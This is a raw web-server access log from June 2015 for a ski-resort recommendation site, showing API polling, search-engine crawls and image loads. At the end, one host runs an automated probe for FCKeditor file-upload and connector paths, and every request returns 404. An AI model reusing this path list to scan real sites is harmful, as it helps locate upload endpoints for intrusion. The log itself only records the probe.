170.75.162.130 - - [05/Jun/2015:07:52:01 -0700] "GET /lib/reccapi.php?resort=diamondpeak HTTP/1.1" 200 988 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:07:52:01 -0700] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1034 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:07:52:01 -0700] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 1010 "-" "node-superagent/0.18.2"
66.249.75.40 - - [05/Jun/2015:07:52:41 -0700] "GET /resorts?resort=northstar-at-tahoe&date=2012-12-29 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.71.81 - - [05/Jun/2015:07:59:08 -0700] "-" 408 0 "-" "-"
220.181.108.87 - - [05/Jun/2015:08:02:15 -0700] "-" 408 0 "-" "-"
66.249.75.40 - - [05/Jun/2015:08:02:33 -0700] "GET /resorts?resort=silvermountain&date=2014-01-04 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [05/Jun/2015:08:03:02 -0700] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 939 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:08:03:02 -0700] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 1049 "-" "node-superagent/0.18.2"
71.92.81.103 - - [05/Jun/2015:08:07:54 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG SM-G386T Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.6 Chrome/28.0.1500.94 Mobile Safari/537.36"
76.21.3.3 - - [05/Jun/2015:08:09:01 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
66.249.75.56 - - [05/Jun/2015:08:12:25 -0700] "GET /resorts?resort=loveland&date=2014-02-18 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
71.202.6.41 - - [05/Jun/2015:08:18:56 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4"
66.249.75.56 - - [05/Jun/2015:08:22:17 -0700] "GET /resorts?resort=beavermountain&date=2013-04-06 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
31.3.233.115 - - [05/Jun/2015:08:30:07 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
180.76.15.137 - - [05/Jun/2015:08:30:33 -0700] "GET /resorts?resort=panoramamountain&date=2014-04-06 HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.75.48 - - [05/Jun/2015:08:32:09 -0700] "GET /resorts?resort=whitewater&date=2013-12-07 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.40 - - [05/Jun/2015:08:42:01 -0700] "GET /resorts?resort=belleayre&date=2014-02-05 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [05/Jun/2015:08:45:06 -0700] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 1052 "-" "node-superagent/0.18.2"
66.249.75.56 - - [05/Jun/2015:08:51:54 -0700] "GET /resorts?resort=buttermilk&date=2014-02-15 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
208.115.111.66 - - [05/Jun/2015:08:52:16 -0700] "GET /robots.txt HTTP/1.1" 200 319 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
170.75.162.130 - - [05/Jun/2015:08:52:36 -0700] "GET /lib/reccapi.php?resort=cannonmountain HTTP/1.1" 200 1033 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:08:52:36 -0700] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1097 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:08:52:37 -0700] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 1068 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:08:52:37 -0700] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 1105 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:08:52:37 -0700] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 1079 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:08:52:37 -0700] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 1055 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:08:52:37 -0700] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 1106 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:08:52:37 -0700] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 986 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:08:52:37 -0700] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 989 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:08:52:37 -0700] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 992 "-" "node-superagent/0.18.2"
123.125.71.58 - - [05/Jun/2015:08:52:43 -0700] "-" 408 0 "-" "-"
68.109.67.45 - - [05/Jun/2015:08:54:31 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
68.109.67.45 - - [05/Jun/2015:08:54:52 -0700] "-" 408 0 "-" "-"
71.93.85.16 - - [05/Jun/2015:08:57:35 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17"
220.181.108.111 - - [05/Jun/2015:08:57:48 -0700] "-" 408 0 "-" "-"
66.249.75.48 - - [05/Jun/2015:09:01:46 -0700] "GET /resorts?resort=wildcatmountain&date=2014-03-02 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.56 - - [05/Jun/2015:09:11:38 -0700] "GET /resorts?resort=snowbird&date=2014-02-20 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.136 - - [05/Jun/2015:09:19:24 -0700] "GET /resorts?resort=pajaritomountain&date=2014-01-19 HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.17 - - [05/Jun/2015:09:20:18 -0700] "GET /resorts?resort=pajaritomountain&date=2014-01-19 HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [05/Jun/2015:09:21:29 -0700] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 1040 "-" "node-superagent/0.18.2"
66.249.75.40 - - [05/Jun/2015:09:21:30 -0700] "GET /resorts?resort=bigsky&date=2014-02-07 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.48 - - [05/Jun/2015:09:31:22 -0700] "GET /resorts?resort=purgatory&date=2013-02-18 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [05/Jun/2015:09:32:30 -0700] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 1010 "-" "node-superagent/0.18.2"
66.249.75.56 - - [05/Jun/2015:09:41:14 -0700] "GET /resorts?resort=taos&date=2013-12-15 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.48 - - [05/Jun/2015:09:51:06 -0700] "GET /resorts?resort=bridgerbowl&date=2014-02-01 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.71.42 - - [05/Jun/2015:09:52:44 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [05/Jun/2015:09:55:02 -0700] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 1040 "-" "node-superagent/0.18.2"
220.181.108.121 - - [05/Jun/2015:09:55:58 -0700] "-" 408 0 "-" "-"
66.249.75.40 - - [05/Jun/2015:10:00:58 -0700] "GET /resorts?resort=sugarbush&date=2014-01-07 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
208.115.111.66 - - [05/Jun/2015:10:02:56 -0700] "GET / HTTP/1.1" 200 6095 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
107.193.139.14 - - [05/Jun/2015:10:07:18 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/41.0.2272.56 Mobile/12D508 Safari/600.1.4"
66.249.75.40 - - [05/Jun/2015:10:10:50 -0700] "GET /resorts?resort=parkcity&date=2013-12-10 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [05/Jun/2015:10:11:13 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1100 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:10:11:14 -0700] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1136 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:10:11:14 -0700] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1102 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:10:11:14 -0700] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1072 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:10:11:14 -0700] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1071 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:10:11:14 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1019 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:10:11:14 -0700] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1087 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:10:11:14 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1025 "-" "node-superagent/0.18.2"
170.75.162.130 - - [05/Jun/2015:10:11:14 -0700] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1005 "-" "node-superagent/0.18.2"
107.77.92.84 - - [05/Jun/2015:10:16:44 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4"
66.249.75.56 - - [05/Jun/2015:10:20:42 -0700] "GET /resorts?resort=angelfire&date=2014-02-02 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
71.140.31.214 - - [05/Jun/2015:10:21:27 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; 786908940603; Build/14.08001)"
95.238.88.244 - - [05/Jun/2015:10:28:24 -0700] "GET / HTTP/1.1" 200 2376 "http://buttons-for-your-website.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:24 -0700] "GET /styles/0fffd548.main.css HTTP/1.1" 200 19316 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:25 -0700] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6702 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:25 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:25 -0700] "GET /images/logo-sm.png HTTP/1.1" 200 16737 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:25 -0700] "GET /images/loading.gif HTTP/1.1" 200 13881 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:25 -0700] "GET /scripts/fa48e319.main.js HTTP/1.1" 200 123455 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:27 -0700] "GET /images/button.png HTTP/1.1" 200 598 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:27 -0700] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1809 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:28 -0700] "GET /images/greyHeader.png HTTP/1.1" 200 508 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:28 -0700] "GET /images/snowflake5.png HTTP/1.1" 200 2857 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:28 -0700] "GET /images/star5.png HTTP/1.1" 200 1783 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:28 -0700] "GET /images/bluebird5.png HTTP/1.1" 200 2177 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:31 -0700] "GET /images/shading-icon.png HTTP/1.1" 200 537 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:32 -0700] "GET /images/mtns-icon.png HTTP/1.1" 200 1096 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
95.238.88.244 - - [05/Jun/2015:10:28:51 -0700] "-" 408 0 "-" "-"
95.238.88.244 - - [05/Jun/2015:10:28:51 -0700] "-" 408 0 "-" "-"
127.0.0.1 - - [05/Jun/2015:10:28:52 -0700] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.2.22 (Ubuntu) (internal dummy connection)"
66.249.75.40 - - [05/Jun/2015:10:30:34 -0700] "GET /resorts?resort=devilshead&date=2014-02-05 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
71.155.147.219 - - [05/Jun/2015:10:38:51 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4"
66.249.75.48 - - [05/Jun/2015:10:40:26 -0700] "GET /resorts?resort=whitefacemountain&date=2014-02-09 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
70.211.68.59 - - [05/Jun/2015:10:42:14 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53"
66.249.75.48 - - [05/Jun/2015:10:50:18 -0700] "GET /resorts?resort=hyland&date=2014-02-17 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
108.32.7.94 - - [05/Jun/2015:10:52:32 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0"
66.249.75.40 - - [05/Jun/2015:11:00:10 -0700] "GET /resorts?resort=timberline&date=2014-02-20 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.71.73 - - [05/Jun/2015:11:05:24 -0700] "-" 408 0 "-" "-"
104.177.110.166 - - [05/Jun/2015:11:05:56 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3"
170.75.162.130 - - [05/Jun/2015:11:08:58 -0700] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 1127 "-" "node-superagent/0.18.2"
66.249.75.48 - - [05/Jun/2015:11:10:03 -0700] "GET /resorts?resort=arapahoebasin&date=2014-02-09 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [05/Jun/2015:11:17:09 -0700] "GET /lib/reccapi.php?resort=stevenspass HTTP/1.1" 200 973 "-" "node-superagent/0.18.2"
66.249.75.40 - - [05/Jun/2015:11:19:54 -0700] "GET /resorts?resort=mtrose&date=2014-02-14 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [05/Jun/2015:11:26:10 -0700] "GET /lib/reccapi.php?resort=devilshead HTTP/1.1" 200 945 "-" "node-superagent/0.18.2"
66.249.75.40 - - [05/Jun/2015:11:29:47 -0700] "GET /resorts?resort=snowmass&date=2014-02-02 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
107.151.213.225 - - [05/Jun/2015:11:32:50 -0700] "HEAD /fckeditor/editor/filemanager/connectors/aspx/upload.aspx HTTP/1.1" 404 219 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:50 -0700] "HEAD /fckeditor/editor/filemanager/connectors/asp/upload.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:50 -0700] "HEAD /fckeditor/editor/filemanager/connectors/php/upload.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /fckeditor/editor/filemanager/upload/aspx/upload.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /fckeditor/editor/filemanager/upload/asp/upload.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /fckeditor/editor/filemanager/connectors/aspx/connector.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /fckeditor/editor/filemanager/connectors/asp/connector.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /fckeditor/editor/filemanager/connectors/php/connector.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /fckeditor/editor/filemanager/browser/default/connectors/php/connector.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/connectors/aspx/upload.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/connectors/asp/upload.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/connectors/php/upload.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/upload/aspx/upload.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/upload/asp/upload.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/connectors/aspx/connector.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/connectors/asp/connector.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/connectors/php/connector.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:51 -0700] "HEAD /includes/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /includes/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx HTTP/1.1" 404 163 "-" "-"
107.151.213.225 - - [05/Jun/2015:11:32:52 -0700] "HEAD /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp HTTP/1.1" 404 163 "-" "-"
